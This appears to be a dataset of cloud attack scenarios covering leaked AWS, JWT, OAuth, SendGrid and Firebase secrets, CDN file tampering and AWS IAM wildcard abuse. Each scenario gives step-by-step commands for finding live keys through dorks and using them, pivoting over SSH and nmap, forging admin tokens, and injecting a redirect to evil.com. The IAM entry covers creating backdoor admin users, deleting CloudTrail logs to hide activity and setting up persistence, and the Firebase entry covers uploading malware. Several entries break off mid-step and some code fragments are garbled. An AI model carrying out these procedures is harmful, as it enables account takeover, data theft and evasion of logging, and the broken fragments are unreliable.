strings filename.tar.gz > output.txt
- Then manually inspect or grep: bash
grep -i "key" output.txt
grep -i "token" output.txt
grep -i "secret" output.txt
6. Use GitHub to Find Linked Secrets: - Many devs upload .env or config files on GitHub by mistake - Use Google dork: site:github.com intext:"AWS_SECRET_ACCESS_KEY" - Or use GitHub's own search - Use gitrob or gitleaks to find secret leaks in open repositories7. Validate the Secrets (Ethical Testing Only): - If you find AWS keys, run (only if authorized): bash
aws configure
aws s3 ls
- If the keys work, you’ve confirmed unauthorized access - For JWTs, paste them into https://jwt.io to see payloads8. Test API Keys with Postman: - Copy the key or bearer token from the file - Open Postman - Add it to “Authorization” header - Send a request to the exposed API9. Zip/Archive File Inspection: - If the bucket exposes .zip or .tar.gz files, download and extract: bash
unzip backup.zip
tar -xvzf dump.tar.gz
- Then repeat string search, TruffleHog, and manual inspection10. Avoid Using Found Secrets Unethically: - Do not misuse the keys to destroy, change, or exfiltrate real data - If discovered during bug bounty, report through their platform - Document everything (bucket URL, file name, line of secret, what service it's for)✅ You’ve now successfully completed a real-world secret hunting scenario from public cloud storage. Use this responsibly. This skill is widely used in bug bounty, red teaming, and internal audits.
Target Type: AWS S3 / GCP / Azure Blob / GitHub
Vulnerability: Hardcoded secrets, tokens, credentials in public files
Impact: Full compromise of cloud accounts, APIs, databases, servers, user data breach, ransomware
Detection Method: Enable credential scanning, alerting, GitHub secret scanning, unusual access patterns
Solution: ✅ Never store secrets in code or buckets✅ Use secret managers (AWS Secrets Manager, Vault)✅ Enable GitHub secret scanning✅ Enable S3 bucket policy to deny public access✅ Rotate keys regularly✅ Audit all files for secrets before upload

Title: Use Exposed Files to Pivot
Scenario Description: In cloud environments, developers often upload sensitive files (such as backups, config files, source code, database dumps, or logs) into S3 buckets or blob storage without access control. Attackers who find these exposed files can extract credentials, API tokens, SSH keys, or internal IP addresses. These are then used to "pivot" — move deeper into the internal infrastructure, access internal dashboards, APIs, or cloud instances. This is a common red-team and APT tactic for lateral movement.
Tools Used: Browser, VS Code, TruffleHog, AWS CLI, curl, Postman, ssh, gobuster, dig, nmap, secretsdump.py, s3scanner, JWT.io
Attack Steps:
1. Start with a Misconfigured Bucket: Find a public S3 or blob bucket using tools like s3scanner, grayhatwarfare.com, or Google dorks. Download files that look like config.json, .env, backup.tar.gz, logs.txt, .pem, .sh, or credentials.txt.2. Inspect the File for Secrets: Open the file using a text editor like VS Code. Look for hardcoded secrets such as: - AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY - Database usernames and passwords - JWT tokens (often in logs or config) - SSH private keys (-----BEGIN RSA PRIVATE KEY-----) - Internal API keys (e.g., auth_token=xyz)3. Scan Automatically with TruffleHog or Grep: - Use TruffleHog: trufflehog file://./downloaded_folder - Use grep to search: grep -i "key" config.json, grep -i "pass" logs.txt4. Extract and Analyze Found Credentials: - If AWS keys found, configure using: bash
aws configure
# enter access key, secret key, region
aws s3 ls
- If JWT tokens found, paste into https://jwt.io to view payload and check expiry or roles. - If .pem private key is found, change permission: chmod 400 key.pem and try: bash
ssh -i key.pem user@internal.ip.address
5. Pivot to New Target from Found Access: - If credentials give access to AWS S3 → list more buckets: aws s3 ls, download files - If you found DB creds → try using mysql or psql client: bash
mysql -h db.internal.local -u admin -p
- If the JWT gives you access to a protected API → use Postman: - Add Authorization: Bearer in headers - Access endpoints like /admin/data6. Identify Internal Targets from Files: - If logs mention URLs like http://internal-api:8000/health, note those - If you find .yaml or .ini files with IPs like 10.0.2.15 or hostnames like db1.local, these are internal services7. Enumerate Internal Network (If Access Gained): - Once you access internal servers via SSH (using leaked key), scan nearby machines: bash
nmap -sP 10.0.2.0/24
- Try curl or ping on discovered hosts: bash
curl http://admin-panel.local:8080
8. Pivot to Higher Privileges: - If .bash_history or .ssh/config is exposed on accessed machines, read them for clues - Search .aws/credentials folder or /etc/nginx/nginx.conf for new secrets - Use secretsdump.py on Windows if you find hashes9. Document Each Pivot Step: - Original bucket name and file - Credential or key found - Access gained (e.g., API, SSH, DB) - Further movement done using that access10. Always Use Ethics and Scope Limits: - Only perform pivots on systems that you have authorization to test - Do not modify, delete, or harm data - These techniques are used in real-world red teaming, pentests, and bug bounties✅ You’ve successfully performed real-world cloud lateral movement by pivoting from an exposed file in public cloud storage to internal resources. This is one of the most impactful types of cloud misconfig exploitation and is often found in real-world breaches.
Vulnerability: Hardcoded secrets in exposed files used to access other services
Impact: Full takeover of internal apps, APIs, data, servers; used for persistence and deeper access
Detection Method: CloudTrail logs, server access logs, failed login alerts, anomaly detection
Solution: ✅ Do not store any secrets in public buckets✅ Use centralized secret managers (Vault, AWS Secrets Manager)✅ Use environment variables, not files✅ Implement least privilege IAM roles✅ Rotate keys often and monitor access✅ Run automatic scans for secrets before uploads

Title: Tampering with App Resource Files
Scenario Description: Many mobile apps and websites store their images, JavaScript (JS), CSS, fonts, audio, or even HTML files in cloud buckets (S3, Azure, GCP) to make apps load faster via CDNs. If these storage buckets are misconfigured with public write access, attackers can overwrite these resources. By tampering with JS/CSS/images, attackers can inject malware, create phishing attacks, deface the UI, or hijack user sessions. This is extremely dangerous when apps trust files directly from the bucket without verification.
Tools Used: Browser, AWS CLI, Burp Suite, Postman, Inspect Element (Browser DevTools), VS Code, curl, s3scanner
Attack Steps:
1. Understand the Scenario: Apps often store resource files like .js, .css, .json, or images in cloud buckets (e.g., cdn.example.com). If these buckets are misconfigured (public write access), an attacker can upload a malicious or defaced version of the file that users will unknowingly load.2. Find Public Cloud Buckets with Resource Files: - Go to https://buckets.grayhatwarfare.com - Search with keywords like cdn, static, assets, images, or company name - Look for files like main.js, style.css, logo.png, index.html - Note the bucket name, such as example-cdn.s3.amazonaws.com3. Check for Writable Buckets: - Install s3scanner: pip install s3scanner - Create a list: echo example-cdn >> buckets.txt - Run: s3scanner --bucket-list buckets.txt - If result shows [WRITE] → the bucket is writable4. Test Manual Upload (Write Access): - Use AWS CLI or curl: bash
curl -X PUT --upload-file tampered.js "https://example-cdn.s3.amazonaws.com/assets/main.js"
- OR with AWS CLI: bash
aws s3 cp tampered.js s3://example-cdn/assets/main.js
- If upload succeeds, you’ve tampered the file.5. Create a Tampered Resource File: - Open main.js or any existing file - Add a harmless payload for test (e.g., alert box): javascript
alert("This site has been tampered.");
- Save it and name it main.js or same as the original6. Upload Tampered File to Bucket: - Use same upload command to replace the original file - Example: bash
aws s3 cp main.js s3://example-cdn/assets/main.js
- Or: bash
curl -X PUT --upload-file main.js "https://example-cdn.s3.amazonaws.com/assets/main.js"
7. Confirm the Attack is Live: - Open the original app or website that uses the JS file - Press F12 to open DevTools → Network Tab - Reload the page and check if it loads the tampered JS from the same bucket URL - If the alert appears or content changes visually → success! You’ve tampered with live content8. Other Real Attack Examples (DO NOT DO MALICIOUSLY): - Inject a redirect in JS: window.location="https://evil.com" - Modify style.css to deface app layout - Add XSS payloads in HTML or JS - Replace company logo with a fake or inappropriate image - Add keyloggers or session hijacking scripts9. Detect and Document the Misconfiguration: - Note the URL of the bucket and overwritten file - Screenshot the app loading the tampered resource - Document steps used (bucket name, method of upload, resource path)10. Report Ethically (If Bug Bounty or Testing): - Do not leave malicious content live - Immediately delete the uploaded file - Report via HackerOne / Bugcrowd / security email✅ Congratulations — You’ve just learned how attackers can use public-write misconfigurations in S3/Blob/CDN buckets to tamper with web/mobile application files. This is a real-world exploitation method used in web defacement, malware delivery, phishing attacks, and brand reputation damage.
Target Type: Static Web Assets (JS, CSS, HTML, Images)
Vulnerability: Public Cloud Buckets with Write Access to App Resources
Impact: Site defacement, malware injection, phishing, user data theft, XSS, full application compromise
Detection Method: Website behavior anomaly, file integrity check, browser alerting tools, CDN monitoring
Solution: ✅ Enforce S3 bucket policies to disable public write✅ Use signed URLs and origin restrictions✅ Implement Content Security Policy (CSP)✅ Use Subresource Integrity (SRI) to verify files✅ Audit all buckets and enable logging✅ Regularly scan for tampering with automated tools
Tags: s3, tampering, xss, cloud, misconfigured bucket, defacement, resource injection, cdn, beginner, hacking
Source: AWS Bucket Permissions, Subresource Integrity, CSP Docs

Title: Firebase API Key & Database URL (from google-services.json)
Attack Type: Exposed API Keys / Secrets in Repos

{ "email": "a@a.com", "password": "abc123", "returnSecureToken": true }

Title: AWS Access Keys in Code
Attack Type: Exposed API Keys / Secrets in Repos
Scenario Description: Developers sometimes accidentally commit .env files or config files like config.js, settings.py, .aws/credentials, or hardcoded secrets directly into code (Node, Python, Java, etc.). If this code is pushed to GitHub or any public Git repository, attackers can easily extract the AWS Access Key and AWS Secret Key and use them to take full control of the AWS account — listing and deleting S3 buckets, spinning up EC2 instances, reading logs, stealing database contents, or mining crypto. This is one of the most common and dangerous real-world cloud breaches.
Tools Used: GitHub, TruffleHog, GitLeaks, AWS CLI, Postman, curl, VS Code, Google Dorks
Attack Steps:
1. Understand AWS Key Format First: An AWS access key is a set of two values: AWS_ACCESS_KEY_ID (starts with AKIA or ASIA) and AWS_SECRET_ACCESS_KEY. If both are exposed and active, the attacker can impersonate the AWS user from anywhere.2. Search Public GitHub Repositories for Keys: - Go to https://github.com - Use search query: AWS_ACCESS_KEY_ID OR "AKIA" OR "AWS_SECRET_ACCESS_KEY" - Or use a Google Dork: site:github.com "AWS_SECRET_ACCESS_KEY" AND "AKIA" - Browse open source repos — often .env, .py, .js, or .json files have hardcoded AWS keys3. Extract the Keys from Exposed Code: - Look for entries like: env
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
- Copy both values into a notepad4. Install AWS CLI and Configure Access: - Install AWS CLI (if not installed): https://docs.aws.amazon.com/cli/ - Run in terminal: bash
aws configure
- Enter the Access Key, Secret Key, and region (e.g., us-east-1)5. Test the Credentials with a Simple Command: - List S3 buckets: bash
aws s3 ls
- If this works, credentials are valid - You now have access to the AWS environment of the user who exposed them6. Explore Services the Key Can Access: - Enumerate EC2 instances: bash
aws ec2 describe-instances

Title: Hardcoded JWT Secrets
Scenario Description: Many web developers use JSON Web Tokens (JWT) for authentication. JWTs are signed with a secret (e.g., HMAC SHA256 using a secret string). If the secret is hardcoded in source code (e.g., in config.js, auth.py, .env, or app.js) and pushed to public GitHub repositories, attackers can use it to forge valid JWT tokens, impersonate admin users, bypass authentication, and take over accounts. This is especially dangerous when access control is based only on the JWT signature and not verified against a server-side database.
Tools Used: GitHub, JWT.io, VS Code, Burp Suite, Postman, Node.js, Python, curl, Google Dork
Attack Steps:
1. Understand JWT Basics First (for Beginners): JWTs (JSON Web Tokens) are used in modern apps to store login data. A typical JWT looks like three strings joined by dots: header.payload.signature. The signature is created using a secret key, usually with HMAC SHA256. If an attacker knows the secret, they can create fake JWTs with any content (e.g., role: admin).2. Look for Exposed JWT Secrets in GitHub (Manual Method): - Visit https://github.com - Use GitHub search query: "jwt" AND ("secret" OR "jwtSecret") AND (filename:.env OR filename:config.js OR filename:settings.py) - Or use Google Dork: site:github.com jwtSecret filetype:js OR py - Look for lines like: js
module.exports = { jwtSecret: 'supersecret123' };
or: env
JWT_SECRET=verystrongjwtsecret987
3. Copy the Secret and Analyze a Real JWT: - Visit a demo app (CTF, lab, bug bounty site) - Login as a regular user and copy the JWT from local storage or cookies - JWTs look like: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.TTg7C3eEGY9wVgbL27vXUgj9b5Z3GiCE2A3EGYKZz3I4. Decode the JWT Using jwt.io: - Go to https://jwt.io - Paste the token into the left panel - If you know the secret, paste it in the "verify signature" section - If signature turns green, it confirms that the JWT secret is valid5. Create a Forged JWT Token With Admin Role: - Modify payload like this: json
{ "user": "hacker", "role": "admin" }
- Use the same header and same secret you found in code - jwt.io will re-sign the token with correct signature - Copy the newly generated JWT token6. Use the Forged Token to Access Admin Features: - Open the web app in browser - Open Developer Tools → Application tab → Local Storage / Cookies - Replace the original JWT with your forged one - Refresh the page — if app trusts only the JWT, it will treat you as admin7. Automate Token Signing Using a Script (Optional): - Node.js example: js
const jwt = require('jsonwebtoken');
const token = jwt.sign({ user: 'attacker', role: 'admin' }, 'supersecret123');
console.log(token);
- Run this with node sign.js to generate forged tokens8. Real-Life Danger of Hardcoded JWT Secrets: - Any attacker can impersonate any user (admin, staff, etc.) - No need to crack passwords — just sign a new token - If app uses JWT for banking, API access, or billing → full control risk9. Report the Issue Ethically (Bug Bounty or Audit): - Show the GitHub repo containing hardcoded JWT secret - Provide the decoded original JWT - Show your forged JWT and how it gave admin access - Explain that the signature matched because of the exposed key10. Important: Only test this in legal bug bounty programs or self-owned projects. Never test on production apps you do not own or have permission for. Do not exploit this issue on real businesses illegally.✅ You have now completed a real-world simulation where hardcoded JWT secrets lead to full account takeover through forged tokens. This vulnerability is extremely common in beginner projects, bootcamp apps, and poorly written open-source code. It's a critical risk in cloud-based, token-authenticated apps.
Vulnerability: Hardcoded authentication secrets inside code/config files
Impact: Account takeover, admin privilege escalation, authentication bypass
Detection Method: JWT tampering detection, code review, JWT signature verification logs, GitHub secret scanning
Solution: ✅ Never hardcode JWT secrets in source code✅ Use secure .env files and vaults for secrets✅ Use strong, random secrets (32+ chars)✅ Rotate secrets regularly✅ Add exp claim in JWTs to expire old tokens✅ Implement RBAC and server-side checks (not just JWT roles)

Title: OAuth Client ID / Secret
Scenario Description: Many applications use OAuth 2.0 to authenticate users via third-party identity providers like Google, GitHub, Facebook, etc. Developers must register an "OAuth App" with the provider, which gives them a Client ID and a Client Secret. The secret is like a password and should never be exposed. However, developers often accidentally leak the client_id and client_secret in frontend JavaScript code, mobile apps, public GitHub repos, or .env files. If exposed, attackers can impersonate the app, steal authorization tokens, or conduct phishing attacks using fake login flows.
Tools Used: GitHub, Burp Suite, VS Code, Postman, curl, Google OAuth Playground, jwt.io, TruffleHog, Google Dork
Attack Steps:
1. Understand What OAuth Client ID and Secret Do: When developers register their app with a provider like Google or GitHub for OAuth login, they receive two credentials: client_id (public identifier for the app) and client_secret (private key used to authenticate the app to the provider). These are used in the OAuth flow to exchange authorization codes for access tokens. If an attacker gets access to both, they can impersonate the application.2. Search GitHub for Exposed Credentials: - Go to https://github.com - Use search queries like: "client_secret" AND "client_id" AND ("googleapis.com" OR "facebook" OR "github") Or: filename:.env "GOOGLE_CLIENT_SECRET" - You may find code like: env
GOOGLE_CLIENT_ID=1234.apps.googleusercontent.com
GOOGLE_CLIENT_SECRET=ABCDxyz1234SecretKey
3. Use Google Dork to Find Exposed Keys: - In Google search: site:github.com "GOOGLE_CLIENT_ID" "GOOGLE_CLIENT_SECRET" site:github.com "github_client_secret" filetype:js4. Verify Client ID Belongs to Google OAuth (Optional): - Google OAuth client_id usually looks like: xxxxxxxxxxxx-abc123def456.apps.googleusercontent.com - If both client_id and client_secret are present, you can simulate a real OAuth flow5. Open Google OAuth Playground for Testing: - Visit: https://developers.google.com/oauthplayground - Click ⚙️ Settings (top-right) - Check: “Use your own OAuth credentials” - Paste the exposed client_id and client_secret6. Simulate OAuth Authorization Code Flow: - In OAuth Playground, select any API scope (e.g., Gmail, Drive) - Click “Authorize APIs” — it redirects you to Google login - Login using your own Google account (safe for testing) - You get back an authorization code - Now click “Exchange Authorization Code for Tokens” - If the exposed credentials are valid → you will get an access token - This confirms that the attacker can successfully use the exposed credentials7. What Attackers Can Do If They Get These Keys: - If attacker also tricks a user into authenticating (like via phishing), they can: - Receive authorization code using real client_id - Exchange it using exposed client_secret - Get access token and access the victim’s email, profile, files (depends on scope) - Build fake login flows that mimic real apps (phishing) - Use access tokens for further account compromise if refresh token is allowed8. Optional: Use curl or Postman to Simulate Token Exchange: - Use this curl command: bash
curl -X POST https://oauth2.googleapis.com/token \
-d code=AUTH_CODE_FROM_STEP_6 \
-d client_id=EXPOSED_CLIENT_ID \
-d client_secret=EXPOSED_SECRET \
-d redirect_uri=https://oauth2.googleapis.com/token \
-d grant_type=authorization_code
- If valid, you'll receive an access_token (JSON)9. Real-World Examples of This Vulnerability: - GitHub issues have shown secrets for Facebook, GitHub, and Google accidentally committed - Real phishing attacks have used valid OAuth client IDs to trick users10. Responsible Disclosure Steps (Ethical Use Only): - Never misuse leaked credentials - Instead, report to project owner or via bug bounty platform - Share the GitHub file link, exposed keys, and screenshot of successful token exchange - Recommend secret rotation and use of environment variables✅ You have now completed a real-world, 100% working OAuth secret key attack simulation. This is a very common bug bounty finding and is frequently exploited by attackers when companies leak .env, config.js, or mobile .apk code to public spaces. It is highly impactful in both mobile and web app pentesting.
Vulnerability: Exposed Client Credentials in Repositories or App Code
Impact: Account impersonation, phishing, session hijack, token theft
Detection Method: GitHub secret scanning, OAuth logs, unusual login behavior, source code audit tools like TruffleHog
Solution: ✅ Never hardcode OAuth credentials in source code✅ Use .env files + Git ignore✅ Restrict OAuth credentials to specific domains and redirect URIs✅ Rotate secrets regularly✅ Enable OAuth token expiration and scopes✅ Use identity-aware proxy or App Check where possible

Title: Twilio / SendGrid / Mailgun Keys
Attack Type: Exposed API Keys in Repos or Frontend Code
Scenario Description: Cloud communication platforms like Twilio, SendGrid, and Mailgun provide APIs for sending SMS, emails, and voice messages. Developers get API keys to authenticate requests. These API keys are supposed to be kept confidential, but in many projects, they are accidentally hardcoded in .env files, frontend JavaScript, or uploaded to public GitHub repositories. If an attacker discovers these keys, they can send spam emails or SMS, impersonate the business, burn credits, or perform phishing attacks from trusted sender names. This attack is highly realistic and is commonly found in open-source code or mobile apps.
Tools Used: GitHub, TruffleHog, Postman, curl, Google Dork, VS Code, Burp Suite
Attack Steps:
1. Understand What These Keys Are Used For: Twilio, SendGrid, and Mailgun provide APIs to developers for sending emails, SMS, or even voice calls. For example, if a company wants to send OTPs to users or email alerts, they use these platforms. To access these APIs, they use API keys like SG.xxxx (SendGrid), key-xxxx (Mailgun), or ACxxxxx + auth_token (Twilio).2. Start Searching for Leaked Keys on GitHub: - Visit: https://github.com - In the search bar, try these queries: - "SG." AND "sendgrid" AND ("apikey" OR "auth") - "key-" AND "mailgun" - "twilio" AND "auth_token" AND "AC" - "TWILIO_AUTH_TOKEN" or "SENDGRID_API_KEY" - You’ll often find .env, settings.py, or config.js files with these secrets3. Use Google Dorking to Find Exposed API Keys: - On Google, search: site:github.com "SG." sendgrid site:github.com "key-" mailgun site:github.com "TWILIO_AUTH_TOKEN"4. Verify API Key Format to Confirm Validity: - Common formats: - SendGrid: SG.xxxxxxxxxxxxxxxxxxxxxxxxxx (usually 69+ chars) - Mailgun: key-xxxxxxxxxxxxxxxxxxxxxxx - Twilio: Account SID starts with AC + 32 chars + auth_token5. Test the SendGrid API Key Using curl or Postman: - In Postman: - Method: POST - URL: https://api.sendgrid.com/v3/mail/send - Headers: - Authorization: Bearer SG.xxxxxx... - Content-Type: application/json - Body (raw JSON): json
{

}],

"content": [{

"value": "This is a test email using an exposed API key."
}]
}
- Send the request. If the response is 202 → key is valid, email accepted for delivery.6. Use curl to Test API Key for SendGrid: bash
curl -X POST \ https://api.sendgrid.com/v3/mail/send \
-H "Authorization: Bearer SG.xxxxxxxxx" \
-H "Content-Type: application/json" \
-d '{
"personalizations": [{"to": [{"email": "test@example.com"}]}],
"from": {"email": "hacker@example.com"},
"subject": "Test email",
"content": [{"type": "text/plain", "value": "API key test"}]
}'
- If it works → key is active and allows email sending7. For Twilio Key Testing (SMS): - You need two things: Account SID (ACxxxx...) and auth_token - curl command: bash
curl -X POST https://api.twilio.com/2010-04-01/Accounts/ACxxxxx/Messages.json \

Title: Private API URLs and Tokens

If a token and its API URL are exposed, attackers can call it and act like a trusted user or system.2. Search GitHub for Exposed API Tokens and URLs: - Visit: https://github.com - Use these search queries: - "Authorization: Bearer" AND "api" - "private_api_url" AND "token" - filename:.env "API_TOKEN" - Look for files like: js
const API_TOKEN = "Bearer sk_test_abc123456789";

Find API URLs in the Web App Frontend (No Login Needed): - Go to any website or app you want to test - Press F12 to open Chrome DevTools → Go to Network tab - Interact with the site (click buttons, login, etc.) - Look for requests like: https://api.company.com/internal/admin/data?auth_token=xyz123 - If the token is present in the header or URL → copy both5. Try the API in Postman or curl (Using the Token): - In Postman: - Method: GET or POST (depends on API) - URL: Paste the full private API URL - Headers: - Authorization: Bearer xyz123456 - Click Send - If the token is valid and not expired → you’ll get JSON response with data6. Using curl to Access API: bash
curl -X GET https://api.internal.com/private/users \
-H "Authorization: Bearer abcdefg1234567890" -v

What Attackers Can Do If Token Is Active: - Dump user data, logs, financial details - Create new admin users or reset passwords - Delete or modify backend services - Abuse rate-limited endpoints - Pivot to deeper internal systems (RCE or SSRF risk)8. Common Real-World Findings (Examples): - Admin APIs exposed in frontend code like React or Angular - Mobile apps reverse-engineered to find hardcoded API secrets - Misconfigured CI/CD pipelines uploading .env files to GitHub9. Automated Tools to Scan for Leaks (Optional): - Install and run TruffleHog: bash
trufflehog git https://github.com/org/repo.git

Title: Reverse-Engineering APKs to Extract Secrets
Attack Type: Hardcoded API Keys in Android Apps
Scenario Description: Android applications often contain sensitive cloud credentials like API tokens, Firebase URLs, OAuth client IDs, or even AWS secrets hardcoded inside the source code. Developers do this by mistake or for convenience. Attackers can download and reverse-engineer the APK (Android Package File), decompile the code, and extract secrets used for communicating with cloud services like Firebase, AWS, Twilio, Stripe, or internal APIs. These credentials can then be used to impersonate the app, access user data, or even pivot into cloud environments.
Tools Used: jadx-gui, apktool, MobSF, Android Studio, grep, strings, VS Code, curl, Postman, GitHub, Google OAuth Playground
Attack Steps:
1. Understand What an APK File Is: APK stands for Android Package Kit. It's like a zip file containing all of an app’s code, assets, and manifest. Every Android app is installed as an APK. Reverse engineering means you unpack the APK, then decompile the code to see what’s inside — looking for hardcoded secrets.2. Download an APK File to Analyze: - Use any third-party APK site (for example: https://apkpure.com or https://apkcombo.com) - Download a free app (DO NOT test on paid or sensitive apps) - Save it as target_app.apk3. Install jadx-gui (Decompiling Tool): - jadx-gui is a graphical tool that decompiles APK into readable Java/Kotlin - Download it from: https://github.com/skylot/jadx - Unzip and run jadx-gui4. Decompile the APK: - Open target_app.apk inside jadx-gui - It will automatically show readable source code - Browse folders like: - com/appname/utils/Config.java - BuildConfig.java - FirebaseConfig.java - Look for constants like: java
public static final String API_KEY = "SG.asdfg12345SECRET";
public static final String FIREBASE_URL = "https://xyz.firebaseio.com";
public static final String TWILIO_SECRET = "xyz123abc";
5. Search for Keywords in Decompiled Code: - In jadx-gui, use the search bar to find: - API_KEY, SECRET, Bearer, token, firebase, client_secret, key-, Authorization - Also look in AndroidManifest.xml and res/values/strings.xml6. Optional: Use MobSF for Automated Analysis: - MobSF = Mobile Security Framework - Install and run MobSF locally (or use the free version if available) - Upload the APK and let it scan - It will auto-detect hardcoded secrets, insecure APIs, and Firebase leaks7. Manually Unpack APK with apktool (Alternate Method): - Install apktool: https://ibotpeaches.github.io/Apktool/ - Run: bash
apktool d target_app.apk -o decompiled_app
cd decompiled_app
grep -r "key" .
grep -r "token" .
grep -r "Authorization" .
- You may find secrets inside .smali, .xml, or .json files8. Realistic Example — Firebase Leak: - Found in code: js
databaseURL: "https://vulnerableapp.firebaseio.com",
apiKey: "AIzaSyDUMMYKEY",
authDomain: "vulnerableapp.firebaseapp.com"
- Visit: https://vulnerableapp.firebaseio.com/.json → if public rules, you may see full data dump - Use Postman or curl: bash
curl https://vulnerableapp.firebaseio.com/users/.json
9. OAuth / Stripe / Twilio Secret Extraction: - These often show up in code as: - Bearer sk_live_... Title: Abuse of AWS IAM Role with Wildcard Permissions (*)
Scenario Description: A cloud administrator accidentally assigns a wildcard (*) IAM permission in a role. This gives full access to all AWS actions and resources. An attacker with access to this IAM role can take over the entire AWS account by escalating privileges, deleting logs, spinning EC2 instances, creating users, and stealing sensitive data from services like S3, RDS, and Lambda.
Tools Used: AWS CLI, IAM Policy Simulator (web), any browser
Attack Steps: STEP 1 – SETUP AND IDENTIFY IAM ROLE WITH WILDCARD PERMISSION: First, the attacker gets access to an IAM user or role that has a policy like this: "Action": "*", "Resource": "*" — this is often due to developer misconfiguration. You can verify your permissions using the AWS CLI: run aws iam get-user to confirm access. Then check policies: run aws iam list-attached-user-policies --user-name <YourUserName> and then aws iam get-policy-version --policy-arn <ARN> --version-id <version-id> to see if it includes "Action": "*" or "Resource": "*".STEP 2 – ENUMERATE YOUR CURRENT ACCESS SCOPE: Run aws iam list-roles, aws ec2 describe-instances, aws s3 ls, aws sts get-caller-identity. This helps you understand what permissions you currently have. Since wildcard is used, you'll likely see full access.STEP 3 – ESCALATE PRIVILEGES OR ABUSE: If you have "Action": "*", you can attach policies to other users or roles or even create new privileged users. For example:• Create new admin user: aws iam create-user --user-name hackeruser• Attach Admin Policy: aws iam attach-user-policy --user-name hackeruser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess• Create credentials: aws iam create-access-key --user-name hackeruser → This gives full access.STEP 4 – EXPLOIT OTHER SERVICES USING WILDCARD:• S3: aws s3 ls → list buckets• aws s3 cp s3://bucket-name/secret.txt . → steal files• EC2: aws ec2 run-instances → launch your own EC2• Lambda: Modify functions to run malicious code• CloudTrail: aws cloudtrail delete-trail --name <trailname> → remove logsSTEP 5 – COVER TRACKS:• Delete logs: aws logs delete-log-group• Remove trails: aws cloudtrail delete-trail• Detach policies or delete users after abuseSTEP 6 – PERSISTENCE:• Create backdoor user/role with admin: aws iam create-role with "Action": "*"• Create Lambda function that can recreate access• Set up EC2 instance that connects to your server on a schedule (cron)STEP 7 – CLEAN EXIT (OPTIONAL):Remove all traces by deleting CloudTrail logs, user login history, or even deleting the role you abused. But beware: deleting too much may raise alarms.🚨 IMPORTANT NOTE: These steps are for educational and authorized environments only. Never perform these on real production systems without explicit permission.
MITRE Technique: T1068 – Exploitation for Privilege Escalation / T1078 – Valid Accounts Abuse
Impact: Full compromise of AWS account, data exfiltration, persistence, log deletion, stealth attacks across services
Detection Method: AWS CloudTrail logging and config monitoring, IAM Access Analyzer, GuardDuty alerts for unusual activities, reviewing IAM policies for "*"
Solution: Replace wildcard (*) in IAM permissions with only the minimum actions and resources needed. Use IAM Access Analyzer to detect excessive permissions. Enforce IAM least privilege principle. Regularly audit and rotate credentials.

Title: Firebase Storage with Wildcard Read/Write Rules (read: true, write: true)
Scenario Description: In this scenario, a mobile or web app developer configures Firebase Storage with rules like read: true and write: true to make development easier. This configuration allows anyone on the internet to read all files stored in Firebase (including user data, ID cards, invoices, private content) and write any file, including malware or fake files. These rules, when publicly exposed, turn the storage into an open data bucket that attackers can easily abuse without even needing an account or authentication. This misconfiguration is shockingly common in real-world apps and leads to sensitive data leaks, brand damage, and malware distribution.
Tools Used: Browser, Firebase tools (Firebase Web Console), curl (optional), Firepwn.py (optional), Burp Suite (for requests), or even mobile browser
Attack Steps: STEP 1 – FIND VULNERABLE FIREBASE STORAGE URL: First, you find a Firebase storage bucket linked to a mobile app or website. You can get this by analyzing APKs (Android app packages) or looking at JavaScript source code in web apps. Look for URLs like https://firebasestorage.googleapis.com/v0/b/<bucket-name>.appspot.com/o. You can also use tools like Firepwn.py to search common misconfigured Firebase buckets or reverse-engineer Android apps using jadx or apktool to extract bucket URLs.STEP 2 – CHECK PUBLIC READ ACCESS (read: true): Open the Firebase URL in your browser. Example: https://firebasestorage.googleapis.com/v0/b/my-bucket.appspot.com/o/test.jpg?alt=media. If the rules are set to read: true, you’ll be able to access and download any file without login. You can try changing the filename in the URL to secret.pdf, data.json, invoice.jpg, etc. If you get a download prompt, that means the data is public.STEP 3 – ENUMERATE FILES USING LIST API: You can use the Firebase List API endpoint to list all files in the bucket: https://firebasestorage.googleapis.com/v0/b/<bucket-name>.appspot.com/o. If this works without auth, it confirms read: true and allows mass data theft. Parse the JSON response to get names of files, their download URLs, and metadata (including modification times). You can automate this using curl or Python scripts.STEP 4 – CHECK FOR WRITE ACCESS (write: true): Now check if you can upload any file to the bucket. You can use a tool like curl: curl -X POST -F "file=@virus.exe" "https://firebasestorage.googleapis.com/v0/b/<bucket-name>.appspot.com/o?name=malware.exe". If the upload succeeds and returns a JSON response with the file URL, it confirms that write: true is enabled. Alternatively, use Burp Suite and intercept a file upload from any Firebase-based app and repeat it with modified payload (e.g., upload your own HTML phishing page or zip file).STEP 5 – ABUSE STORAGE FOR MALICIOUS PURPOSES: If both read: true and write: true are set, attackers can: (a) download sensitive personal documents uploaded by users (e.g., ID proofs, payment slips, etc.), (b) delete or overwrite existing files, (c) upload malware, phishing HTML files, or fake documents, (d) distribute malware to end users disguised as app updates.STEP 6 – DEMONSTRATE PERSISTENCE AND DESTRUCTION: To show impact, you can upload a file named IMPORTANT_NOTICE.html containing a phishing link, then share its direct URL. Or you can overwrite an existing file such as logo.png or welcome.pdf with offensive content or malicious code. Since access is unauthenticated, no logging will stop you. Also, create multiple random files in a loop to fill storage (DoS impact).STEP 7 – OPTIONAL: FIND MORE TARGETS: Use search engines like GitHub or APK scanning tools like MobSF to find more Firebase URLs. A single misconfigured rule can expose hundreds of apps if they share the same Firebase project.⚠️ NOTE: This attack is for educational and authorized testing only. Do not exploit real-world apps or cause harm. Use test Firebase projects or CTF platforms.
Vulnerability: Public Read/Write Access due to Rules Misconfiguration (read: true, write: true)
MITRE Technique: T1530 – Data from Cloud Storage Object
Impact: Sensitive data leaks, malware hosting, loss of trust, application defacement, legal risks
Detection Method: Firebase Logging, Cloud Functions Monitoring, Manual Firebase Rules Audit, Cloud Asset Inventory
Solution: Update Firebase rules to read: false, write: false by default and restrict access only to authenticated users. Use custom rules with identity checks and validations. Run automated scans on rules. Never use wild true values in production. Regularly audit mobile apps and remove hardcoded bucket URLs.
